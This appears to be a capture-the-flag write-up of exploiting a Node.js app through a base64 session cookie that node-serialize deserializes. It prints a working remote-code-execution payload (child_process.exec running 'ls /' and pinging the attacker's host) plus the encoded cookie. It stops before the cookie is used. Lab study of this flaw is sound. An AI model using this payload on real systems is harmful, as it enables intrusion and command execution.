As i hit the ip in the browser this was our first look with the target

![homepage](homepage.png)

As i went through the source code i got the this js code 

```js
    document.getElementById("signup").addEventListener("click", function() {
	var date = new Date();
    	date.setTime(date.getTime()+(-1*24*60*60*1000));
    	var expires = "; expires="+date.toGMTString();
    	document.cookie = "session=foobar"+expires+"; path=/";
    	const Http = new XMLHttpRequest();
        console.log(location);
        const url=window.location.href+"?email="+document.getElementById("fname").value;
        Http.open("POST", url);
        Http.send();
	setTimeout(function() {
		window.location.reload();
	}, 500);
    }); 
```

As this code suggest us the below exploit to try.

- Broken authentication
- Client-side trust issues
- Parameter tampering
- Cookie manipulation

For the stuff of parameter injection i tried fuzzing for endpoints at http://10.48.144.111/FUZZ but returned with no output.

And since in the field subscibe for the newsletter enter email field shows  a text field and when somethingi is entered there and tap on submit it shows as on the same pageas

We'll keep you updated at : <entered text>

Now each time we hit submit it req to a parameter http://10.48.144.111/?email=<Entered Text>

So as per our attacker mindset i tried there for lfi. But not succeded so i interad try SQLI but it too not worked.

When i saw carefully the session token it was encoding the below structure based on your input into base64 adn putting it as the session id.

The structure is 

Decoded text: {"email":"Your Entered Text in that input field"}


As we can see that there is a text that made with nodejs and as per our finding there is specific flaw about specifically this in nodejs.


When viewed on burp suite http history we could see it is sending 2 req to verify that text one is post req to /?email=<Entered Text> and one to root / with a session id.


![sess](session.png)

The session id is also binding to the another get req to intercepting and changing is not possible here.

Meaning the workflow if when i submit a text to the text field this text is displayed too and encoded to base64 too and encoded text is assigned as session id.


There is already a exploit for this type of vulnerblity that is 

```url
https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/
```

Now the workflow of this exploit is 

1. Create a js file
2. Then searialize that js file with node <js file name>
3. This is gave you a payload base64 it with the format {"email":"<email>"} 
4. Put it as a session id and see what is reflecting on  the page.

If we go deep into the technical depth of it workflow we will get that

 Whatever we pass as email seems to be getting serialized and then deserialized and posted to the page.


We can test if this is true by adjusting the{"email":"<email>"} “<email>” portion in the decoder, encoding it with base64 then putting it back into the browser as our session cookie. If we refresh the page we should see it. reflected on the page.

And it happens exactly what we expect.

If we refer to that exploit page it is doing it for the directory listing with "ls /" with the below js file

```js
var y = {
 rce : function(){
 require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) });
 },
}
var serialize = require('node-serialize');
console.log("Serialized: \n" + serialize.serialize(y));
```

Now if we are doing to for ping. Now come with me further and see how we are going to make the host ping our machine.

We will use the same above but with ping

```js
var y = {
 email : function(){
 require('child_process').exec('ping -c 1 10.49.171.98', function(error, stdout, stderr) { console.log(stdout) });
 },
}
var serialize = require('node-serialize');
console.log("Serialized: \n" + serialize.serialize(y));
```

Now we move on the 2nd step of workflow of the exploit.

.i.e, Searilizing the file with the command node filename.js


This is giving me the below code as per the ping one file above.

```node
Serialized: 
{"email":"_$$ND_FUNC$$_function(){\n require('child_process').exec('ping -c 1 10.49.171.98', function(error, stdout, stderr) { console.log(stdout) });\n }"}
```

Now we'll convert it into the base64 encoding since it 100% mathces with the original structer

```text
{"email":"<email>"}
```

And in this way we have moved to step 4 of our workflow of the exploit.

and the base64 encoded text is

```base64
eyJlbWFpbCI6Il8kJE5EX0ZVTkMkJF9mdW5jdGlvbigpe1xuIHJlcXVpcmUoJ2NoaWxkX3Byb2Nlc3MnKS5leGVjKCdwaW5nIC1jIDEgMTAuNDkuMTcxLjk4JywgZnVuY3Rpb24oZXJyb3IsIHN0ZG91dCwgc3RkZXJyKSB7IGNvbnNvbGUubG9nKHN0ZG91dCkgfSk7XG4gfSJ9
```

We are going to insert it as  a session cokkie and see what changes happens into the homepage after inserting the cookie and then refresing the page.


